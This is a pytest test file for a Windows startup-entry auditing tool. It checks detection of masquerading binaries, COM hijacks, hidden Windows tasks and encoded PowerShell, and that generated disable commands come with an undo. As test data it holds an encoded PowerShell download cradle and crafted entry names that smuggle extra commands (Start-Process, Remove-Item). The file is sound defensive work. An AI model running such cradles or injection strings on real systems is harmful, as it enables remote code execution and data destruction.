import base64

from uninvited import rules


def test_parse_dn_handles_quoted_commas():
    dn = rules.parse_dn('CN="Cloudflare, Inc.", O="Cloudflare, Inc.", L=San Francisco, C=US')
    assert dn["CN"] == "Cloudflare, Inc."
    assert dn["O"] == "Cloudflare, Inc."


def test_publisher_prefers_organisation():
    assert rules.publisher({"signer": "E=dev@perplexity.ai, CN=PERPLEXITY AI, INC., O=\"PERPLEXITY AI, INC.\", C=US"}) == "PERPLEXITY AI, INC."


def test_signed_third_party_needs_the_model(entry_factory):
    e = rules.analyze(entry_factory())
    assert not e["is_windows"] and not e["zombie"] and e["flags"] == []
    assert rules.decide(e) == ("unexplained", "Not examined yet.")


def test_missing_file_is_a_zombie(entry_factory):
    e = rules.analyze(entry_factory(file={"exists": False}))
    assert e["zombie"]
    verdict, _ = rules.decide(e, {"category": "updater", "confidence": "high"})
    assert verdict == "lay_to_rest"


def test_model_cannot_rescue_a_zombie_or_a_poltergeist(entry_factory):
    zombie = rules.analyze(entry_factory(file={"exists": False}))
    assert rules.decide(zombie, {"category": "security", "confidence": "high"})[0] == "lay_to_rest"
    temp = entry_factory(target=r"C:\Users\x\AppData\Local\Temp\upd.exe", command=r"C:\Users\x\AppData\Local\Temp\upd.exe")
    temp["file"] = {"exists": True, "sigStatus": "NotSigned"}
    e = rules.analyze(temp)
    assert rules.decide(e, {"category": "updater", "confidence": "high"})[0] == "investigate"


def test_encoded_powershell_is_flagged_and_decoded(entry_factory):
    script = "IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a')"
    blob = base64.b64encode(script.encode("utf-16-le")).decode()
    cmd = f"powershell.exe -NoP -W Hidden -enc {blob}"
    e = entry_factory(command=cmd, exe=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                      target=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe")
    e["file"] = {"exists": True, "sigStatus": "Valid", "isOsBinary": True, "signer": "CN=Microsoft Windows, O=Microsoft Corporation"}
    e = rules.analyze(e)
    ids = {f["id"] for f in e["flags"]}
    assert "encoded-powershell" in ids and "hidden-window" in ids
    assert "DownloadString" in e["decoded"]
    # Signed Windows binary, but the command line is the problem.
    assert rules.decide(e)[0] == "investigate"


def test_masquerade_outside_windows(entry_factory):
    e = entry_factory(target=r"C:\ProgramData\svchost.exe", command=r"C:\ProgramData\svchost.exe")
    e["file"] = {"exists": True, "sigStatus": "NotSigned"}
    e = rules.analyze(e)
    assert "masquerade" in {f["id"] for f in e["flags"]}


def test_microsoft_signed_defender_is_not_a_masquerade(entry_factory):
    e = entry_factory(kind="service", target=r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18\MsMpEng.exe")
    e["file"] = {"exists": True, "sigStatus": "Valid", "signer": "CN=Microsoft Corporation, O=Microsoft Corporation"}
    e = rules.analyze(e)
    assert e["flags"] == []


def test_driver_package_shows_real_vendor(entry_factory):
    e = entry_factory(kind="service", target=r"C:\Windows\System32\DriverStore\FileRepository\x\AsusOptimization.exe")
    e["file"] = {"exists": True, "sigStatus": "Valid", "company": "ASUSTeK COMPUTER INC.",
                 "signer": "CN=Microsoft Windows Hardware Compatibility Publisher, O=Microsoft Corporation"}
    e = rules.analyze(e)
    assert e["hardware"] and not e["is_windows"]
    assert e["publisher"] == "ASUSTeK COMPUTER INC."


def test_windows_component(entry_factory):
    e = entry_factory(kind="task", location="\\Microsoft\\Windows\\Defrag\\", target=r"C:\Windows\System32\defrag.exe")
    e["file"] = {"exists": True, "sigStatus": "Valid", "isOsBinary": True, "signer": "CN=Microsoft Windows, O=Microsoft Corporation"}
    assert rules.decide(rules.analyze(e))[0] == "windows"


def test_office_task_is_not_windows(entry_factory):
    e = entry_factory(kind="task", location="\\Microsoft\\Office\\", target=r"C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeC2RClient.exe")
    e["file"] = {"exists": True, "sigStatus": "Valid", "signer": "CN=Microsoft Corporation, O=Microsoft Corporation"}
    assert not rules.analyze(e)["is_windows"]


def test_unverifiable_system_file_in_windows_tasks_is_not_a_poltergeist(entry_factory):
    # Found by CI: on a runner that cannot check catalog signatures, every System32 file reads "NotSigned".
    e = entry_factory(kind="task", location="\\Microsoft\\Windows\\Defrag\\", target=r"C:\Windows\System32\defrag.exe")
    e["file"] = {"exists": True, "sigStatus": "NotSigned"}
    assert "hidden-in-windows-tasks" not in {f["id"] for f in rules.analyze(e)["flags"]}


def test_payload_outside_windows_folder_in_windows_tasks_is_flagged(entry_factory):
    e = entry_factory(kind="task", location="\\Microsoft\\Windows\\WindowsUpdate\\", target=r"C:\ProgramData\WinUpdate\wuauclt.exe")
    e["file"] = {"exists": True, "sigStatus": "NotSigned"}
    e = rules.analyze(e)
    assert "hidden-in-windows-tasks" in {f["id"] for f in e["flags"]}
    assert rules.decide(e)[0] == "investigate"


def test_without_signature_checks_the_windows_folder_is_trusted(entry_factory):
    e = entry_factory(kind="service", target=r"C:\Windows\System32\svchost.exe")
    e["file"] = {"exists": True, "sigStatus": "NotSigned"}
    e = rules.analyze(e, signatures_ok=False)
    assert e["is_windows"] and e["flags"] == []
    temp = entry_factory(target=r"C:\Users\x\AppData\Local\Temp\a.exe")
    temp["file"] = {"exists": True, "sigStatus": "NotSigned"}
    assert rules.decide(rules.analyze(temp, signatures_ok=False))[0] == "investigate"  # still caught by path
    # Found by CI: Defender's own tasks run from ProgramData and could not be verified on the runner.
    defender = entry_factory(kind="task", location="\\Microsoft\\Windows\\Windows Defender\\",
                             target=r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18\MpCmdRun.exe")
    defender["file"] = {"exists": True, "sigStatus": "NotSigned"}
    assert rules.analyze(defender, signatures_ok=False)["flags"] == []
    hidden = entry_factory(kind="task", location="\\Microsoft\\Windows\\Maintenance\\", target=r"C:\Users\x\AppData\Roaming\m.exe")
    hidden["file"] = {"exists": True, "sigStatus": "NotSigned"}
    assert "hidden-in-windows-tasks" in {f["id"] for f in rules.analyze(hidden, signatures_ok=False)["flags"]}


def test_unsigned_in_user_folder_is_investigated(entry_factory):
    e = entry_factory(target=r"C:\Users\x\AppData\Roaming\helper\helper.exe")
    e["file"] = {"exists": True, "sigStatus": "NotSigned"}
    verdict, reason = rules.decide(rules.analyze(e), {"category": "productivity", "confidence": "high"})
    assert verdict == "investigate" and "signed" in reason


def test_category_maps_to_verdict(entry_factory):
    e = rules.analyze(entry_factory())
    assert rules.decide(e, {"category": "updater", "confidence": "high"})[0] == "keep"
    assert rules.decide(e, {"category": "chat-social", "confidence": "high"})[0] == "optional"
    assert rules.decide(e, {"category": "chat-social", "confidence": "low"})[0] == "unknown"


def test_disabled_items_are_dormant(entry_factory):
    e = rules.analyze(entry_factory(enabled=False))
    assert rules.decide(e, {"category": "chat-social", "confidence": "high"})[0] == "dormant"


def test_commands_have_an_undo(entry_factory):
    run = rules.commands(rules.analyze(entry_factory()))
    assert "StartupApproved\\Run" in run["off"] and "(3,0,0" in run["off"] and "(2,0,0" in run["undo"]
    assert run["how"].endswith("(PowerShell)") and not run["admin"]
    svc = rules.commands(entry_factory(kind="service", name="MySQL80", scope="machine"))
    assert svc["off"] == "Set-Service -Name 'MySQL80' -StartupType Manual" and svc["admin"]
    task = rules.commands(entry_factory(kind="task", location="\\Vendor\\", name="Updater"))
    assert task["off"] == "Disable-ScheduledTask -TaskPath '\\Vendor\\' -TaskName 'Updater'"
    zombie = rules.commands(rules.analyze(entry_factory(file={"exists": False})))
    assert zombie["off"].startswith("reg.exe export") and "Remove-ItemProperty" in zombie["off"]
    assert zombie["undo"].startswith("reg.exe import")


def test_commands_cannot_be_hijacked_by_entry_names(entry_factory):
    # Found in review: a crafted name must not run code when the user pastes "Turn off".
    evil = "Updater$(Start-Process calc)'; Remove-Item C:\\x; '"
    for kind in ("run", "task", "service"):
        out = rules.commands(rules.analyze(entry_factory(kind=kind, name=evil, location="\\Vendor\\" if kind == "task" else
                                                         r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run")))
        assert rules.ps_literal(evil) in out["off"], kind
        assert rules.ps_literal(evil) == "'Updater$(Start-Process calc)''; Remove-Item C:\\x; '''"
    startup = rules.commands(entry_factory(kind="startup", shortcut=r"C:\Users\x\Startup\a$(calc).lnk"))
    assert "-LiteralPath 'C:\\Users\\x\\Startup\\a$(calc).lnk'" in startup["off"]


def test_policy_run_entries_are_deleted_not_switched(entry_factory):
    e = rules.analyze(entry_factory(location=r"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"))
    out = rules.commands(e)
    assert "Remove-ItemProperty" in out["off"] and "StartupApproved" not in out["off"] and out["admin"]


def test_tasks_need_admin_unless_they_run_as_you(entry_factory, monkeypatch):
    monkeypatch.setenv("USERNAME", "alex")
    mine = rules.commands(entry_factory(kind="task", location="\\", name="T", run_as="PC\\alex"))
    system = rules.commands(entry_factory(kind="task", location="\\", name="T", run_as="SYSTEM"))
    assert not mine["admin"] and system["admin"]


def test_com_hijack_of_a_windows_task_is_flagged(entry_factory):
    e = entry_factory(kind="task", location="\\Microsoft\\Windows\\Shell\\", com_scope="user",
                      target=r"C:\Users\x\AppData\Roaming\shell.dll", command="COM handler {AB}")
    e["file"] = {"exists": True, "sigStatus": "NotSigned"}
    e = rules.analyze(e)
    assert "com-hijack" in {f["id"] for f in e["flags"]}
    assert rules.decide(e)[0] == "investigate"


def test_unsigned_tool_on_another_drive_is_not_a_poltergeist(entry_factory):
    e = entry_factory(target=r"D:\Apps\tool\tool.exe")
    e["file"] = {"exists": True, "sigStatus": "NotSigned"}
    e = rules.analyze(e)
    assert [f["id"] for f in e["flags"]] == ["unsigned"]
    assert rules.decide(e, {"category": "productivity", "confidence": "high"})[0] == "optional"


def test_unexpanded_paths_classify_like_real_ones():
    assert rules.path_class(r"%APPDATA%\PrinterHelper\update.vbs") == "appdata"
    assert rules.path_class(r"%LOCALAPPDATA%\Temp\x.exe") == "temp"
    assert rules.path_class(r"%USERPROFILE%\Downloads\setup.exe") == "downloads"
    assert rules.path_class(r"%USERPROFILE%\AppData\Local\Temp\svchost.exe") == "temp"
    assert rules.path_class(r"%PUBLIC%\Libraries\a.dll") == "public"
